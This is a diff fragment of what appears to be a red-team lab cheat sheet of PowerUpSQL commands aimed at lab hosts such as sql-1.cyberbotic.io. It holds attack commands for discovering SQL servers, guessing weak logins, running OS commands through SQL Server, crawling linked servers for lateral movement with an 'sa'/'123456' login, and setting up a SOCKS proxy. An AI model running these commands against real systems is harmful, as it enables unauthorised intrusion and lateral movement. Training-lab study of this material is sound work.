@@ -14,21 +14,18 @@ powershell Get-SQLInstanceLocal -Instance "sql-1.cyberbotic.io" -username 'sa' -
 
 ```
 powershell Get-SQLInstanceDomain | Get-SQLConnectionTest
-
 powershell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version'
 powershell Invoke-SQLAuditWeakLoginPw –Verbose
 powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults
-
 powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command "dir c:\windows\system32\Drivers\etc" -RawResults
-
 powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command "ipconfig" -RawResults
-
 powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command "whoami"  –Threads 10
 
 ```
 
 ### Lateral Movement
 ```
+powershell Get-SQLInstanceDomain | Get-SQLConnectionTest
 powershell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
 powershell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
 powershell Get-SQLServerLinkCrawl -verbose -instance "sql-1.cyberbotic.io,1433" -username 'sa' -password '123456'
@@ -37,7 +34,6 @@ powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:
 powershell Invoke-SQLOSCmd -Instance 'sql02.dev.zeropointsecurity.co.uk,1433' -Command 'dir C:\' -RawResults
 
 ```
-
 
 ```
 socks 1080
